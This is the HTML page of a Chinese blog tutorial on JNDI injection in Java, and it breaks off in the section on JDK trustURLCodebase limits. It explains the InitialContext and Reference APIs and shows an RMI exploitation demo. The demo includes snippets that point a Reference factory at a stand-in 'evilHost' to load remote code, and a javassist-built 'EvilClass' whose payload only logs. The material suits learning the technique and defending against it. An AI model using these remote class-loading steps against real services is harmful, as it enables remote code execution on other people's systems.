<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在前面最近打算系统化梳理一下JAVA安全的知识点，本节知识点为JNDI，之前看了好多篇还并不是完全明白，这次再看加深印象。并且想自己动手写一个JNDI-Exploit，锻炼自己的工程化代码能力 什么是JNDI全称：JAVA命名和目录接口（Java Naming and Directory Interface），通过调用JNDI的API可以定位资源和其他程序对象。现有可访问的目录和服务有JDBC">
<meta property="og:type" content="article">
<meta property="og:title" content="JNDI注入浅析">
<meta property="og:url" content="https://racerz-fighting.github.io/2023/01/11/JNDI/index.html">
<meta property="og:site_name" content="RacerZ">
<meta property="og:description" content="写在前面最近打算系统化梳理一下JAVA安全的知识点，本节知识点为JNDI，之前看了好多篇还并不是完全明白，这次再看加深印象。并且想自己动手写一个JNDI-Exploit，锻炼自己的工程化代码能力 什么是JNDI全称：JAVA命名和目录接口（Java Naming and Directory Interface），通过调用JNDI的API可以定位资源和其他程序对象。现有可访问的目录和服务有JDBC">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107183720435.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107191026654.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107220136290.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107220218096.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107220756804.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107221223488.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107221541609.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107222946308.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230108151835588.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230108152530879.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230108170602879.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230109233427089.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230109232706171.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230109234255832.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230109234336910.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230109235346841.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230110000012777.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230110002710554.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230110003154131.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230110003430773.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230110004205440.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230111103858637.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230111104131730.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230111112155439.png">
<meta property="article:published_time" content="2023-01-10T16:00:00.000Z">
<meta property="article:modified_time" content="2023-01-12T09:20:41.270Z">
<meta property="article:author" content="RacerZ">
<meta property="article:tag" content="JAVA安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://racerz-fighting.github.io/2023/01/11/JNDI/image-20230107183720435.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>JNDI注入浅析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/01/12/Yakit/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/11/JNDI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&text=JNDI注入浅析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&is_video=false&description=JNDI注入浅析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JNDI注入浅析&body=Check out this article: https://racerz-fighting.github.io/2023/01/11/JNDI/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&name=JNDI注入浅析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/11/JNDI/&t=JNDI注入浅析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI"><span class="toc-number">2.</span> <span class="toc-text">什么是JNDI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D-gt-Naming-Service"><span class="toc-number">3.</span> <span class="toc-text">命名 &#x3D;&gt; Naming Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95-gt-Directory-Service"><span class="toc-number">4.</span> <span class="toc-text">目录 &#x3D;&gt; Directory Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E7%9A%84%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">一些需要的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Reference-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">JNDI Reference 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-RMI"><span class="toc-number">7.</span> <span class="toc-text">JNDI-RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-LDAP"><span class="toc-number">8.</span> <span class="toc-text">JNDI_LDAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">工具化利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        JNDI注入浅析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">RacerZ</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-01-10T16:00:00.000Z" itemprop="datePublished">2023-01-11</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>最近打算系统化梳理一下JAVA安全的知识点，本节知识点为JNDI，之前看了好多篇还并不是完全明白，这次再看加深印象。并且想自己动手写一个JNDI-Exploit，锻炼自己的工程化代码能力</p>
<h4 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h4><p>全称：JAVA命名和目录接口（Java Naming and Directory Interface），通过调用JNDI的API可以定位资源和其他程序对象。现有可访问的目录和服务有<code>JDBC LDAP RMI DNS NIS CORBA</code></p>
<h4 id="命名-gt-Naming-Service"><a href="#命名-gt-Naming-Service" class="headerlink" title="命名 =&gt; Naming Service"></a>命名 =&gt; Naming Service</h4><p>命名服务主要是将名称和对象相关联，这里的对象并不是实体，而是对象的引用，其中包含着如何去访问对象的信息。</p>
<p>名称系统的几个重要概念</p>
<blockquote>
<p><code>Bindings</code>: 表示一个名称和对应对象的绑定关系<br><code>Context</code>:一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象<code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。</p>
</blockquote>
<h4 id="目录-gt-Directory-Service"><a href="#目录-gt-Directory-Service" class="headerlink" title="目录 =&gt; Directory Service"></a>目录 =&gt; Directory Service</h4><p>目录服务是命名服务的扩展，它允许对象还可以具有属性。提供在目录中进行CRUD对象操作</p>
<p>由此，我们可以通过两种方式使用JNDI：</p>
<ol>
<li>常规方式使用名称服务</li>
<li>使用目录服务作为对象存储的系统，即用目录服务来存储和获取Java对象</li>
</ol>
<p>我们可以通过统一的API来访问不同的目录服务实现，架构如下：</p>
<p>其中的API分为<strong>应用层接口</strong>和<strong>SPI</strong></p>
<p><img src="/2023/01/11/JNDI/image-20230107183720435.png" alt="image-20230107183720435"></p>
<blockquote>
<p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为<strong>底层的具体目录服务</strong>提供统一接口，从而实现目录服务的可插拔式安装</p>
</blockquote>
<h4 id="一些需要的类"><a href="#一些需要的类" class="headerlink" title="一些需要的类"></a>一些需要的类</h4><ul>
<li><p><code>InitialContext</code></p>
<p>构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构建一个初始上下文。</span></span><br><span class="line">InitialContext() </span><br><span class="line"><span class="comment">//构造一个初始上下文，并选择不初始化它。</span></span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line"><span class="comment">//使用提供的环境构建初始上下文。</span></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure>
<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将名称绑定到对象。 </span></span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line"><span class="comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span></span><br><span class="line">list(String name) </span><br><span class="line"><span class="comment">//检索命名对象。</span></span><br><span class="line">lookup(String name)  </span><br><span class="line"><span class="comment">//将名称绑定到对象，覆盖任何现有绑定。</span></span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line"><span class="comment">//取消绑定命名对象。</span></span><br><span class="line">unbind(String name)  </span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Reference</code></p>
<p>对象的引用类</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为类名为“className”的对象构造一个新的引用。</span></span><br><span class="line">Reference(String className) </span><br><span class="line"><span class="comment">//为类名为“className”的对象和地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line"><span class="comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"><span class="comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数：</span></span><br><span class="line"><span class="comment">className 远程加载时所使用的类名</span></span><br><span class="line"><span class="comment">factory  加载的class中需要实例化类的名称</span></span><br><span class="line"><span class="comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将地址添加到索引posn的地址列表中。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line"><span class="comment">//将地址添加到地址列表的末尾。 </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line"><span class="comment">//从此引用中删除所有地址。  </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索索引posn上的地址。 </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line"><span class="comment">//检索地址类型为“addrType”的第一个地址。  </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line"><span class="comment">//检索本参考文献中地址的列举。 </span></span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索引用引用的对象的类名。 </span></span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索此引用引用的对象的工厂位置。  </span></span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索此引用引用对象的工厂的类名。  </span></span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//从地址列表中删除索引posn上的地址。    </span></span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line"><span class="comment">//检索此引用中的地址数。 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//生成此引用的字符串表示形式。</span></span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="JNDI-Reference-注入"><a href="#JNDI-Reference-注入" class="headerlink" title="JNDI Reference 注入"></a>JNDI Reference 注入</h4><p>  前因：为了避免每次在命名服务绑定Java对象时都需要序列化大数据并传输，因此改为换成对象引用的方式。</p>
<blockquote>
<p>对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。</p>
</blockquote>
<p>  引用由Reference来表示，里面包括一个RefAddress地址有序列表和所引用的对象信息，包括类名、创建对象的ObjectFactory类的名称和地址</p>
<p>  <img src="/2023/01/11/JNDI/image-20230107191026654.png" alt="image-20230107191026654"></p>
<blockquote>
<p><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<strong><code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象</strong>。</p>
</blockquote>
<p>  这也是JNDI的利用原理，当lookup参数可控时，便可向指定位置加载恶意对象</p>
<p>  具体流程如下，这里以RMI服务为例</p>
<p>  首先服务端绑定引用到注册中心，并且该引用对象中工厂类位置为恶意class所在位置</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://evilHost/&quot;</span> );     registry.bind(<span class="string">&quot;Exploit&quot;</span>, <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference));</span><br></pre></td></tr></table></figure>
<p>  客户端通过rmi协议发起请求，即可造成恶意文件，实例化类时造成RCE</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">ctx.lookup(<span class="string">&quot;rmi://evilHost/Exploit&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h4><ul>
<li><p>低版本JDK</p>
<p>Evil Server 顺便练了一下javassit生成字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        makeEvilClass();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">factoryUrl</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:1098/&quot;</span>;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>, <span class="string">&quot;EvilClass&quot;</span>, factoryUrl);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Foo&quot;</span>, wrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Server ready, factoryUrl:&quot;</span> + factoryUrl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">        cc.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123; pool.get(<span class="string">&quot;javax.naming.spi.ObjectFactory&quot;</span>) &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;try&#123;System.out.println(\&quot;EvilClass: \&quot; + $1);&#125; catch(Exception e)&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;log&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.STATIC);</span><br><span class="line">        ctMethod.setBody(code);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123;EvilClass.log(\&quot;constructor\&quot;);&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">staticCode</span> <span class="operator">=</span> cc.makeClassInitializer();</span><br><span class="line">        staticCode.setBody(<span class="string">&quot;&#123;EvilClass.log(\&quot;static block\&quot;);&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">returnType</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        CtClass[] parameters = &#123;pool.get(<span class="string">&quot;java.lang.Object&quot;</span>), pool.get(<span class="string">&quot;javax.naming.Name&quot;</span>), pool.get(<span class="string">&quot;javax.naming.Context&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(returnType, <span class="string">&quot;getObjectInstance&quot;</span>, parameters, cc);</span><br><span class="line">        ctMethod1.addParameter(pool.get(<span class="string">&quot;java.util.Hashtable&quot;</span>));</span><br><span class="line">        ctMethod1.setBody(<span class="string">&quot;&#123;EvilClass.log(\&quot;getObjectInstance\&quot;); return null;&#125;&quot;</span>);</span><br><span class="line">        cc.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;D:\\ctf\\JNDI\\src\\main\\java\\&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成的class文件如下</p>
<p><img src="/2023/01/11/JNDI/image-20230107220136290.png" alt="image-20230107220136290"></p>
</li>
</ul>
<p>Client：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Foo&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ret&quot;</span> + ret);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务端启动恶意服务器，客户端运行</p>
<p><img src="/2023/01/11/JNDI/image-20230107220218096.png" alt="image-20230107220218096"></p>
<p><strong>各个代码块执行顺序</strong>：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static在类加载的时候执行</span><br><span class="line">代码块和无参构造方法在clas.newInstance()时执行</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>高版本JDK限制</p>
<p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></p>
<p>如果想要直接运行，如要添加参数</p>
